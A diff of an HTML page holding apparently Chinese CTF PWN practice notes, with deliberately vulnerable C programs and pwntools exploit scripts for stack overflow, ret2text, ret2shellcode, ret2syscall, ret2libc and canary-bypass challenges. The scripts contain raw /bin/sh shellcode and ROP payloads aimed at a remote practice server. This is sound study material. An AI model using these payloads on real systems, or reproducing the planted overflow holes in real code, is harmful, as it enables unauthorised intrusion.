@@ -9,7 +9,7 @@
  知识点：PWN相关知识点总结
  Linux PWN ARM PWN  题目全部来源于 CTFWiki 上所涉及题目
 Linux PWN 大部分原理参考CTFWiki
-栈溢出 基本栈溢出 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void success() { puts(&amp;#34;You Hava already controlled it.&amp;#34;); }void vulnerable() {char s[12];gets(s);puts(s);return;}int main(int argc, char **argv) {vulnerable();return 0;}# gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1stack1.c: In function ‘vulnerable’:stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’?" />
+栈溢出 基本栈溢出 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void success() { puts(&amp;#34;You Hava already controlled it.&amp;#34;); } void vulnerable() { char s[12]; gets(s); puts(s); return; } int main(int argc, char **argv) { vulnerable(); return 0; } # gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1 stack1.c: In function ‘vulnerable’: stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’?" />
 <meta name="keywords" content=", PWN, CTF" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#252627" />
@@ -48,14 +48,15 @@ Linux PWN 大部分原理参考CTFWiki
 
 <meta itemprop="name" content="CTF PWN刷题记录 CTFWiki_1栈溢出">
 <meta itemprop="description" content="CTFWiki_1栈溢出">
-<meta itemprop="datePublished" content="2019-02-20T00:17:21&#43;08:00" />
-<meta itemprop="dateModified" content="2019-02-20T00:17:21&#43;08:00" />
-<meta itemprop="wordCount" content="1054">
+<meta itemprop="datePublished" content="2019-02-20T00:17:21+08:00" />
+<meta itemprop="dateModified" content="2019-02-20T00:17:21+08:00" />
+<meta itemprop="wordCount" content="1044">
 <meta itemprop="image" content="https://kuekiko.top"/>
 
 
 
 <meta itemprop="keywords" content="PWN,CTF," />
+
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://kuekiko.top"/>
 
@@ -171,8 +172,8 @@ Linux PWN 大部分原理参考CTFWiki
 <p>大部分原理参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/">CTFWiki</a></p>
 <h4 id="栈溢出">栈溢出</h4>
 <h5 id="基本栈溢出">基本栈溢出</h5>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">success</span>() { puts(<span style="color:#e6db74">&#34;You Hava already controlled it.&#34;</span>); }
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>() {
   <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">12</span>];
@@ -198,11 +199,11 @@ stack1.c:(.text<span style="color:#f92672">+</span><span style="color:#ae81ff">0
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190406211946.png" alt=""></p>
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190406212108.png" alt=""></p>
 <p>poc1.py</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding=utf-8</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding=utf-8</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-<span style="color:#75715e"># sh = process(&#34;./stack1&#34;)</span>
+<span style="color:#75715e"># sh = process(&#34;./stack1&#34;)</span>
 sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10000</span>)
 success_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048456</span>
 
@@ -260,7 +261,7 @@ AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaA
 <p>payload</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
   
-<span style="color:#75715e"># sh = process(./ret2text)</span>
+<span style="color:#75715e"># sh = process(./ret2text)</span>
 sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10001</span>)
 binsh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804863a</span>
 payload <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">+</span> p32(binsh)
@@ -281,15 +282,15 @@ sh<span style="color:#f92672">.</span>interactive()
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190407132843.png" alt=""></p>
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190407133456.png" alt=""></p>
 <p>payload:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
-<span style="color:#75715e"># sh = process(./ret2shellcode)</span>
+<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
+<span style="color:#75715e"># sh = process(./ret2shellcode)</span>
 sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10002</span>)
-<span style="color:#75715e">## 获得system(&#34;bin/sh&#34;)的asm</span>
+<span style="color:#75715e">## 获得system(&#34;bin/sh&#34;)的asm</span>
 shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
 buf2_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804a080</span>
-<span style="color:#75715e"># sh.sendline(shellcode+&#34;\x90&#34;*(112-len(shellcode))+p32(buf2_addr))</span>
+<span style="color:#75715e"># sh.sendline(shellcode+&#34;\x90&#34;*(112-len(shellcode))+p32(buf2_addr))</span>
 sh<span style="color:#f92672">.</span>sendline(shellcode<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">112</span>,<span style="color:#e6db74">&#34;A&#34;</span>)<span style="color:#f92672">+</span>p32(buf2_addr))
 sh<span style="color:#f92672">.</span>interactive()
 </code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20190407134402.png" alt=""></p>
@@ -334,18 +335,18 @@ _start:
  <span style="color:#960050;background-color:#1e0010">*/</span>
  <span style="color:#a6e22e">shellcode</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">&#34;\</span><span style="color:#66d9ef">x31</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xf6</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x48</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xbb</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x62</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x69</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x6e</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x73</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x68</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x56</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
     <span style="color:#960050;background-color:#1e0010">&#34;\</span><span style="color:#a6e22e">x53</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x54</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x5f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x6a</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x3b</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x58</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x31</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xd2</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x0f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x05</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#75715e">;
-</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
+</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;x64&#39;,os = &#39;linux&#39; )</span>
+<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;x64&#39;,os = &#39;linux&#39; )</span>
 io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./shellcode&#39;</span>)
-<span style="color:#75715e"># io = remote(&#34;47.106.212.155&#34;,10003)</span>
+<span style="color:#75715e"># io = remote(&#34;47.106.212.155&#34;,10003)</span>
 shellcode <span style="color:#f92672">=</span>     <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><span style="color:#e6db74">&#34;</span>
 io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;[&#39;</span>)
 buf_addr <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;]&#39;</span>,drop<span style="color:#f92672">=</span>True)
 buf_addr <span style="color:#f92672">=</span> int(buf_addr,<span style="color:#ae81ff">16</span>)
-<span style="color:#75715e"># print(buf_addr)</span>
+<span style="color:#75715e"># print(buf_addr)</span>
 payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p64(buf_addr<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> shellcode
-<span style="color:#75715e"># 32是24字节的填充数据长度加返回地址长度24+8</span>
+<span style="color:#75715e"># 32是24字节的填充数据长度加返回地址长度24+8</span>
 <span style="color:#66d9ef">print</span> payload
 io<span style="color:#f92672">.</span>sendline(payload)
 io<span style="color:#f92672">.</span>interactive()
@@ -364,10 +365,10 @@ io<span style="color:#f92672">.</span>interactive()
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190407160123.png" alt=""></p>
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190407160710.png" alt=""></p>
 <p>写payload:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
-<span style="color:#75715e"># io = process(./ret2syscall)</span>
+<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
+<span style="color:#75715e"># io = process(./ret2syscall)</span>
 io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10004</span>)
 
 pop_eax_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080bb196</span>
@@ -399,13 +400,13 @@ io<span style="color:#f92672">.</span>interactive()
 <p>exp1:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-<span style="color:#75715e"># io = process(&#39;./ret2libc1&#39;)</span>
+<span style="color:#75715e"># io = process(&#39;./ret2libc1&#39;)</span>
 io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10006</span>)
 binsh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048720</span>
 sym_plt_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048460</span>
 
 payload <span style="color:#f92672">=</span> flat([<span style="color:#ae81ff">112</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;A&#39;</span>,sym_plt_addr,<span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>,binsh_addr])
-<span style="color:#75715e"># &#39;bbbb&#39; 作为函数调用栈返回地址的虚假的地址</span>
+<span style="color:#75715e"># &#39;bbbb&#39; 作为函数调用栈返回地址的虚假的地址</span>
 
 io<span style="color:#f92672">.</span>sendline(payload)
 io<span style="color:#f92672">.</span>interactive()
@@ -416,9 +417,9 @@ io<span style="color:#f92672">.</span>interactive()
 <p>exp:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-<span style="color:#75715e"># io = process(&#39;./ret2libc2&#39;)</span>
+<span style="color:#75715e"># io = process(&#39;./ret2libc2&#39;)</span>
 io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10007</span>)
-<span style="color:#75715e"># binsh_addr = 0x08048720</span>
+<span style="color:#75715e"># binsh_addr = 0x08048720</span>
 sym_plt_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048490</span>
 sym_imp_gets_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048460</span>
 pop_ebx_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804872f</span>
@@ -445,7 +446,7 @@ io<span style="color:#f92672">.</span>interactive()
 <span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> LibcSearcher
 
 context(log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>,arch <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;i386&#39;</span>,os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span> )
-<span style="color:#75715e"># io = process(&#39;./ret2libc3&#39;)</span>
+<span style="color:#75715e"># io = process(&#39;./ret2libc3&#39;)</span>
 io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10008</span>)
 elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2libc3&#39;</span>)
 puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
@@ -469,9 +470,9 @@ io<span style="color:#f92672">.</span>interactive()
 <p>利用 x64 下的 __libc_csu_init 中的 gadgets.</p>
 <p>eg:level5:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#undef _FORTIFY_SOURCE
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable_function</span>() {
 	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">128</span>];
@@ -495,9 +496,9 @@ io<span style="color:#f92672">.</span>interactive()
 <h5 id="高级rop">高级ROP</h5>
 <h6 id="ret2_dl_runtime_resolve">ret2_dl_runtime_resolve</h6>
 <p>XDCTF2015-pwn200</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>()
 {
@@ -545,7 +546,7 @@ stack <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</
 success(<span style="color:#e6db74">&#34;stack -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(stack))
 
 
-<span style="color:#75715e">#  DEBUG(&#34;b *0x4006B9\nc&#34;) 96</span>
+<span style="color:#75715e">#  DEBUG(&#34;b *0x4006B9\nc&#34;) 96</span>
 io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, flat([<span style="color:#e6db74">&#39;11111111&#39;</span>, <span style="color:#ae81ff">0x400793</span>, elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>], elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>], <span style="color:#ae81ff">0x400676</span>, (<span style="color:#ae81ff">80</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">40</span>) <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;1&#39;</span>, stack, <span style="color:#ae81ff">0x4006be</span>]))
 libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>: ]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
 success(<span style="color:#e6db74">&#34;libc.address -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(libc<span style="color:#f92672">.</span>address))
@@ -576,7 +577,7 @@ addr_flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400
 
 H,P <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">6666</span>
 
-<span style="color:#75715e">#r = process(&#39;./readme.bin&#39;)</span>
+<span style="color:#75715e">#r = process(&#39;./readme.bin&#39;)</span>
 r <span style="color:#f92672">=</span> remote(H,P)
 junk  <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;What&#39;s your name? &#34;</span>)
 exploit  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x218</span>
@@ -601,10 +602,10 @@ junk <span style="color:#f92672">+=</span> r<span style="color:#f92672">.</span>
 <p>泄露栈中的Canary</p>
 <p>覆盖 Canary 的低字节，来打印出剩余的 Canary 部分</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// ex2.c
-</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getshell</span>(<span style="color:#66d9ef">void</span>) {
     system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
 }
@@ -627,28 +628,28 @@ junk <span style="color:#f92672">+=</span> r<span style="color:#f92672">.</span>
     <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }
 </code></pre></div><p>EXP</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
    
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
    
-context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ex2&#39;</span><span style="color:#75715e">#全局系统自动设置，为官方推荐设置，ex2为文件名称。</span>
-<span style="color:#75715e">#context.log_level = &#39;debug&#39;#debug模式下才开启</span>
-io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ex2&#39;</span>) <span style="color:#75715e">#本地连接到ex2</span>
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ex2&#39;</span><span style="color:#75715e">#全局系统自动设置，为官方推荐设置，ex2为文件名称。</span>
+<span style="color:#75715e">#context.log_level = &#39;debug&#39;#debug模式下才开启</span>
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ex2&#39;</span>) <span style="color:#75715e">#本地连接到ex2</span>
    
-get_shell <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ex2&#34;</span>)<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;getshell&#34;</span>] <span style="color:#75715e">#由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。</span>
+get_shell <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ex2&#34;</span>)<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;getshell&#34;</span>] <span style="color:#75715e">#由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。</span>
    
-io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Hello Hacker!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#75715e">#接受传来的第一部分字符</span>
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Hello Hacker!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#75715e">#接受传来的第一部分字符</span>
    
-<span style="color:#75715e"># leak Canary</span>
+<span style="color:#75715e"># leak Canary</span>
 payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span> 
-io<span style="color:#f92672">.</span>sendline(payload) <span style="color:#75715e">#传输100个A</span>
+io<span style="color:#f92672">.</span>sendline(payload) <span style="color:#75715e">#传输100个A</span>
    
 io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>)
-Canary <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))<span style="color:#f92672">-</span><span style="color:#ae81ff">0xa</span> <span style="color:#75715e">#因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a</span>
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Canary:&#34;</span><span style="color:#f92672">+</span>hex(Canary))<span style="color:#75715e">#日志记录下canary</span>
+Canary <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))<span style="color:#f92672">-</span><span style="color:#ae81ff">0xa</span> <span style="color:#75715e">#因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Canary:&#34;</span><span style="color:#f92672">+</span>hex(Canary))<span style="color:#75715e">#日志记录下canary</span>
    
-<span style="color:#75715e"># Bypass Canary</span>
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span><span style="color:#f92672">+</span>p32(Canary)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span><span style="color:#f92672">+</span>p32(get_shell)<span style="color:#75715e">#发送最后的payload</span>
+<span style="color:#75715e"># Bypass Canary</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span><span style="color:#f92672">+</span>p32(Canary)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span><span style="color:#f92672">+</span>p32(get_shell)<span style="color:#75715e">#发送最后的payload</span>
 io<span style="color:#f92672">.</span>send(payload)
    
 io<span style="color:#f92672">.</span>recv()
@@ -668,7 +669,7 @@ stop <span style="color:#f92672">=</span> len(p)<span style="color:#f92672">+</s
   
       <span style="color:#66d9ef">if</span> res <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
          p <span style="color:#f92672">=</span> p <span style="color:#f92672">+</span> chr(i)
-         <span style="color:#75715e">#print &#34;\t[+] Byte found 0x%02x&#34; % i</span>
+         <span style="color:#75715e">#print &#34;\t[+] Byte found 0x%02x&#34; % i</span>
          <span style="color:#66d9ef">break</span>
   
       <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">255</span>:
